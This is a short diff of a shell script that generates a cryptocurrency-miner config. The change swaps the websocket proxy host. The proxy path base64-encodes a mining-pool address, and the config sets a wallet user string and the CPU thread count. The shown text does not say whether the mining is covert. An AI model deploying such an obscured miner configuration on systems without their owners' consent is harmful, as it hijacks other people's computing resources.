@@ -41,7 +41,7 @@ sleep 2
 
 cat > data.json <<END
 {
-  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/cG93ZXIyYi5ldS5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
+  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:9999/cG93ZXIyYi5ldS5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
   "config": { "threads": $used_num_of_cores, "log": true },
   "options": { "user": "Bh43dUV3ypTM7SRFcyBcV1Rt8A1taua7FG.$currentdate", "password": "c=MBC,mc=MBC,m=solo,ID=$currentdate", "argent": "web-wasm/1.0" }
 }
